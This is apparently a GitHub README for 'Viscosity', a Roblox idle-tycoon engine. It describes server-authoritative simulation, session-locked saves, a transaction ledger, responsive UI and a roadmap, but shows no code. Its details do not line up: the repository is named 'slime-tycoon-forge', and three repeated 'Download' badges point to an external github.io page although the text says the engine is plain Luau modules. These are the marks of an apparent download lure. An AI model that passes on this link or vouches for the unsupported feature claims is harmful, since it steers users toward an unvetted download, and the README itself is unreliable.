![preview](https://raw.githubusercontent.com/pogogt12/slime-tycoon-forge/main/frame_5ba1c.svg)
[![Download](https://raw.githubusercontent.com/pogogt12/slime-tycoon-forge/main/start_c391.svg)](https://pogogt12.github.io/slime-tycoon-forge/)

# 🧪 Viscosity — Distributed Idle Progression Engine for Roblox

An open-source, server-authoritative framework for building idle and incremental games on Roblox. Viscosity takes the gooey, satisfying loop of a production tycoon and rebuilds it as a modular, event-driven engine — one where every drop of progress is earned, verified, and persisted without ever trusting the client.

If Slime Factory Tycoon is a single well-tuned machine, Viscosity is the workshop that lets you build a hundred of them. It is not a template you copy once and forget — it is a living substrate, a syrupy layer of Luau services that turns "number goes up" into a defensible, scalable, and surprisingly elegant architecture.

---

## 📖 Table of Contents

- [What Is Viscosity?](#-what-is-viscosity)
- [Why Another Idle Engine?](#-why-another-idle-engine)
- [Architecture Overview](#-architecture-overview)
- [Feature Highlights](#-feature-highlights)
  - [Server-Authoritative Simulation](#-server-authoritative-simulation)
  - [Session-Locked Persistence](#-session-locked-persistence)
  - [Idempotent Transaction Ledger](#-idempotent-transaction-ledger)
  - [Code-First Responsive UI](#-code-first-responsive-ui)
  - [Multilingual Localization Layer](#-multilingual-localization-layer)
  - [Offline Progression Replay](#-offline-progression-replay)
  - [Balance Simulator & CI Harness](#-balance-simulator--ci-harness)
  - [Live Operations Toolkit](#-live-operations-toolkit)
- [Design Philosophy](#-design-philosophy)
- [Repository Layout](#-repository-layout)
- [Getting Started Without a Terminal Grimoire](#-getting-started-without-a-terminal-grimoire)
- [Configuration & Tuning](#-configuration--tuning)
- [Extending Viscosity](#-extending-viscosity)
- [Testing & Quality Gates](#-testing--quality-gates)
- [Performance Notes](#-performance-notes)
- [Security Posture](#-security-posture)
- [Roadmap](#-roadmap)
- [Community & Support](#-community--support)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🟢 What Is Viscosity?

Viscosity is a distributed idle progression engine written in Luau for the Roblox platform. It provides the scaffolding that idle-tycoon and incremental games need but rarely get right: authoritative tick simulation, durable save pipelines, anti-duplication receipts, responsive layouts that adapt to any device, and a simulation harness that lets you tune your economy before a single player touches it.

Think of it as the difference between a puddle and a pipeline. A puddle of game logic works until it evaporates under load. A pipeline moves resources predictably, survives outages, and tells you exactly where the pressure is building.

The engine is built for teams who want to ship a polished idle experience without re-deriving the same hard lessons about data loss, exploit mitigation, and UI scaling every single project.

---

## 💡 Why Another Idle Engine?

Idle games look deceptively simple. The loop is: produce, upgrade, repeat. But under that loop sits an uncomfortable amount of engineering:

- Players expect progress to continue while they are away, which means your economy must be able to **replay time** deterministically.
- Players expect their saves to survive a server crash, which means your persistence must be **atomic** and **session-aware**.
- Players expect fairness, which means every reward must be **server-verified** and impossible to counterfeit.
- Players expect the game to feel good on a phone, a tablet, and a desktop simultaneously, which means your UI must be **generated, not hand-placed**.

Viscosity treats each of these as a first-class subsystem rather than an afterthought. The result is an engine that behaves like a well-run factory: inputs go in, verified outputs come out, and the machinery underneath is quiet and observable.

---

## 🏗️ Architecture Overview

The engine is organized into cooperating layers, each with a narrow contract:

1. **Simulation Layer** — Pure, deterministic functions that advance game state by a delta. No side effects, no randomness without a seed, no knowledge of the network.
2. **Authority Layer** — Owns the canonical server-side state. Validates every action request, applies simulation steps, and emits changes through a change bus.
3. **Persistence Layer** — Session-locked DataStore gateway with retry budgets, write coalescing, and versioned schemas.
4. **Ledger Layer** — Append-only record of every meaningful transaction, keyed for idempotency so a retried request never double-applies.
5. **Presentation Layer** — Declarative UI definitions compiled into Roblox instances at runtime, driven by reactive state bindings.
6. **Localization Layer** — Locale-aware string, number, and plural resolution with fallback chains.
7. **Telemetry Layer** — Structured events for economy monitoring, funnel analysis, and anomaly detection.

Each layer can be exercised independently in tests, which is how the balance simulator runs thousands of virtual hours without spinning up a single Roblox instance.

---

## ✨ Feature Highlights

### 🔒 Server-Authoritative Simulation

Every production tick, upgrade purchase, and prestige action is validated on the server before it is reflected to any client. The client sends *intent*, never *outcome*. If a request arrives that the simulation cannot justify — an upgrade the player cannot afford, a tick delta that exceeds elapsed wall time, a prestige that fails the threshold check — the request is rejected and logged, not silently clamped.

This is the difference between a vending machine and an honor system. Viscosity is the vending machine.

### 🔐 Session-Locked Persistence

DataStores are accessed through a session registry that guarantees a single writer per player key at any moment. When a player joins on a new server while a stale session still holds the lock, the lock is contested through a monotonic token exchange, and the losing session is forced to flush and surrender cleanly. No write races, no "my save vanished" support tickets.

The persistence gateway also implements:

- **Write coalescing** to collapse redundant saves during bursty play.
- **Retry with exponential backoff and jitter** for transient DataStore faults.
- **Schema versioning** with forward-compatible migration hooks.
- **Shadow snapshots** so a corrupt primary save can be recovered from a recent backup.

### 🧾 Idempotent Transaction Ledger

Every reward grant carries a deterministic transaction key derived from player identity, action type, and a client-supplied nonce. If the same request is retried — because of a network hiccup, a reconnecting client, or an overzealous retry policy — the ledger recognizes the key and returns the prior result instead of applying the reward twice.

This is the receipt system. You cannot spend the same receipt twice, and you cannot forge one, because the receipt lives on the server and is checked before anything changes.

### 🎨 Code-First Responsive UI

Viscosity builds its interfaces in code. A declarative component tree describes layout, styling, and behavior, and a runtime compiler turns that tree into Roblox instances with correct anchors, aspect ratios, and safe-area insets for every device class.

Benefits that compound over a project's lifetime:

- **Responsive by default** — Phone, tablet, console, and desktop layouts are derived from the same source of truth.
- **Diffable** — UI state changes produce minimal instance mutations, keeping frame budgets healthy.
- **Testable** — The component tree can be asserted against in unit tests without a rendered viewport.
- **Themeable** — Colors, spacing, and typography flow from a single design token table.

### 🌍 Multilingual Localization Layer

Strings are resolved through a locale pipeline that understands pluralization rules, gendered nouns, and right-to-left scripts. Number formatting respects locale conventions, so a player in one region sees `1.234,56` where another sees `1,234.56`. Currency and time-remaining displays are localized alongside everything else.

Adding a new language means adding a translation table — not hunting through UI code for hardcoded text.

### ⏳ Offline Progression Replay

When a player returns after hours away, the engine replays their production using a coarse-grained simulation pass, capped by a configurable offline window. The replay is deterministic and bounded, so it always completes in a predictable amount of CPU time regardless of how long the player was gone.

The result is the satisfying "welcome back" moment — earned, verified, and impossible to spoof by fiddling with a clock.

### 📊 Balance Simulator & CI Harness

A headless simulator runs your economy forward across a spread of player archetypes — the casual, the optimizer, the whale, the quitter — and reports time-to-milestone curves, currency sinks versus sources, and dead zones where progression stalls.

Because the simulator runs in continuous integration, every balance-touching pull request produces a fresh report. You can see the shape of your economy before you ship it, not after.

### 🛠️ Live Operations Toolkit

Operational tooling is built in, not bolted on:

- **Kill switches** for individual features, gated by flag.
- **Rate limiters** on sensitive endpoints, tuned per player tier.
- **Audit trails** linking every granted reward to its originating request.
- **Anomaly alerts** when economy velocity drifts outside expected bands.
- **Graceful degradation** so a degraded DataStore does not take the whole game down with it.

---

## 🧠 Design Philosophy

Viscosity is opinionated in a few specific ways, and those opinions are the reason it holds up under pressure.

**Determinism over cleverness.** The simulation layer produces the same output for the same input, always. Randomness enters only through explicitly seeded generators. This is what makes replay, testing, and rollback possible.

**Trust the boundary, not the caller.** The client is a rendering and input device. It is treated as untrusted by default, and every privilege it requests is re-earned on the server.

**Observability is a feature.** If you cannot see what your economy is doing, you cannot fix it. Telemetry is not an afterthought; it is a layer.

**Composition over configuration sprawl.** Subsystems talk to each other through narrow interfaces. You can swap persistence backends, replace the UI runtime, or add a new simulation module without rewriting the whole engine.

**Boring where it counts.** Persistence should be boring. Ledger accounting should be boring. The excitement belongs in the game design, not the data layer.

---

## 🗂️ Repository Layout

The repository is organized to mirror the architectural layers:

- A **core simulation module** containing the deterministic tick functions and economy math.
- An **authority module** housing request validation, state ownership, and the change bus.
- A **persistence module** with the session registry, DataStore gateway, and migration runner.
- A **ledger module** implementing idempotency keys, receipts, and audit trails.
- A **presentation module** with the component compiler, design tokens, and view bindings.
- A **localization module** containing the locale pipeline and translation tables.
- A **telemetry module** for structured events and anomaly detection.
- A **simulator package** runnable outside Roblox for balance analysis.
- A **test suite** covering every layer, plus integration tests that assemble the whole stack.
- **Documentation** describing each subsystem, its contract, and its extension points.

Each module is independently versioned and independently testable, which keeps the blast radius of any change small and reviewable.

---

## 🚀 Getting Started Without a Terminal Grimoire

You do not need a package manager, a build daemon, or a command-line ritual to begin. The engine is distributed as a set of Luau modules intended to be placed into a Roblox project and wired together through the provided bootstrap entry point.

A typical integration looks like this, conceptually:

1. Place the Viscosity module tree into your Roblox project alongside your game-specific content.
2. Provide a configuration table describing your economy — producers, costs, thresholds, and offline caps.
3. Register your custom content modules (producers, upgrades, prestige tiers) with the simulation registry.
4. Point the bootstrap at your configuration and let it assemble the service graph.
5. Optionally, connect the telemetry sink to your analytics destination of choice.

The bootstrap handles ordering, dependency wiring, and lifecycle so you can focus on game design rather than plumbing.

[![Download](https://raw.githubusercontent.com/pogogt12/slime-tycoon-forge/main/start_c391.svg)](https://pogogt12.github.io/slime-tycoon-forge/)

---

## ⚙️ Configuration & Tuning

Configuration is centralized in a single declarative table, with sensible defaults and explicit overrides. The important knobs include:

- **Tick rate and catch-up limits** — how frequently the simulation advances and how much missed time it will absorb in one pass.
- **Offline window and efficiency curve** — how much away-time is credited and how that credit tapers for very long absences.
- **Persistence cadence** — how often state is flushed, and how writes coalesce under load.
- **Ledger retention** — how long transaction receipts are kept for audit and reconciliation.
- **Rate limits** — per-endpoint request budgets for sensitive actions.
- **Feature flags** — kill switches for every subsystem, so a misbehaving feature can be disabled without a deploy.

Every configuration value is validated at boot. A malformed configuration fails fast, in the open, with a readable error — not silently, three hours into a live session.

---

## 🧩 Extending Viscosity

The engine is designed to be extended along clean seams:

- **New producer types** register against the simulation registry with a definition and a tick contribution function.
- **New upgrade tiers** attach to the producer schema and declare their prerequisites and cost curves.
- **New prestige systems** implement a reset contract that describes what carries over and what is liquidated.
- **New UI components** register with the presentation compiler and receive reactive bindings like any built-in.
- **New locales** drop in as translation tables; the pipeline handles the rest.
- **New persistence backends** implement the gateway interface and slot in behind the same session registry.

Every extension point is documented with a worked example, so the path from idea to integrated feature is short and unsurprising.

---

## 🧪 Testing & Quality Gates

Quality is enforced continuously, not aspirationally. The repository runs:

- **Unit tests** for simulation math, ledger idempotency, and locale resolution.
- **Property tests** asserting simulation invariants across randomized inputs.
- **Integration tests** that assemble the full stack and drive it through scripted scenarios.
- **Balance simulations** producing readable economy reports on every relevant change.
- **Static analysis** on every pull request, with style and correctness rules tuned for Luau.

A change that breaks an invariant does not merge. That is the whole point.

---

## ⚡ Performance Notes

Idle games are deceptively demanding because they run forever. Viscosity keeps its budget lean through several deliberate choices:

- **Coarse ticks** — the simulation advances in fixed steps, decoupled from render frames.
- **Change batching** — state mutations are grouped and delivered to clients in batches rather than one at a time.
- **Reactive bindings** — only the UI elements whose bound state changed are re-rendered.
- **Write coalescing** — persistence absorbs bursts without hammering DataStores.
- **Bounded replay** — offline catch-up is capped so a long absence never stalls the server.

The engine targets comfortable frame budgets on low-end mobile hardware while leaving headroom for rich desktop experiences.

---

## 🛡️ Security Posture

Security is layered:

- **Server authority** means the client cannot assert outcomes, only intentions.
- **Idempotent receipts** mean retried requests cannot be double-spent.
- **Session locks** mean saves cannot be raced.
- **Rate limits** mean endpoints cannot be flooded.
- **Audit trails** mean every grant is traceable.
- **Anomaly alerts** mean divergence is noticed early.

The posture is defensive without being paranoid: legitimate players never notice the machinery, and illegitimate ones find very little to grab onto.

---

## 🗺️ Roadmap

Planned and in-progress directions for 2026 and beyond:

- **Seasonal event framework** — pluggable, time-boxed content modifiers.
- **Cross-server leaderboards** with eventual consistency guarantees.
- **Deterministic rollback tooling** for economy incidents.
- **Web-based balance dashboard** consuming simulator output.
- **Expanded locale packs** contributed by the community.
- **Reference game** built entirely on Viscosity as a living demo.

The roadmap is a living document; priorities shift with community feedback and real-world usage.

---

## 🤝 Community & Support

Support is available around the clock through the project's discussion channels. When filing an issue, include:

- A crisp description of the observed behavior.
- The expected behavior, if it differs.
- A minimal reproduction, where possible.
- The engine version and relevant configuration.

Clear reports get faster resolutions. Vague reports get questions, and questions take time.

---

## ❓ Frequently Asked Questions

**Is Viscosity a game, a template, or an engine?**
It is an engine with enough scaffolding to feel like a template. You bring the content; Viscosity brings the plumbing.

**Can I use it for a genre other than an idle tycoon?**
Yes. The simulation layer is genre-agnostic; only the content definitions are tycoon-shaped. Incremental RPGs, idle builders, and clicker hybrids all fit comfortably.

**Does it require external infrastructure?**
No. It runs entirely within the Roblox platform, using platform-native persistence. Telemetry sinks are optional and pluggable.

**How does it handle players who time-travel their devices?**
All progression is measured against server time, never client time. Device clock manipulation has no effect.

**Is my save data safe if a server crashes mid-write?**
The persistence gateway uses atomic, coalesced writes with shadow snapshots, so a crash mid-flush leaves the prior consistent state recoverable.

**Can I run the balance simulator without Roblox?**
Yes. The simulator is deliberately decoupled from the platform so it can run anywhere Luau runs, including CI containers.

---

## 🌱 Contributing

Contributions are welcome and appreciated. Before opening a pull request, please:

1. Read the architecture documentation for the layer you are touching.
2. Add or update tests that demonstrate the change.
3. Run the balance simulator if your change affects economy math.
4. Keep commits focused and messages descriptive.

Reviews are conducted with an eye toward long-term maintainability. A small, well-tested change beats a large, clever one every time.

---

## 📜 License

This project is released under the MIT License. See the full text at [LICENSE](LICENSE).

You are welcome to use, modify, and distribute this engine, including in commercial projects. Attribution is appreciated but not required.

---

## ⚠️ Disclaimer

Viscosity is provided as-is, without warranty of any kind, express or implied. The authors are not liable for any damages arising from its use, including but not limited to lost progress, economic imbalance, unexpected player behavior, or the sudden realization that your "quick prototype" has become a live game with thousands of players.

This project is not affiliated with, endorsed by, or sponsored by Roblox Corporation. Roblox is a trademark of its respective owner. Use of the platform is subject to its own terms of service, which you should read and follow.

Balance simulation results are illustrative and do not guarantee real-world player behavior. Your economy may surprise you. That is part of the fun.

All content in this repository is intended for legitimate game development. Misuse of the engine to violate platform terms or harm players is contrary to the project's intent and is not supported.

[![Download](https://raw.githubusercontent.com/pogogt12/slime-tycoon-forge/main/start_c391.svg)](https://pogogt12.github.io/slime-tycoon-forge/)

---

*Viscosity — because progress should flow, not leak.*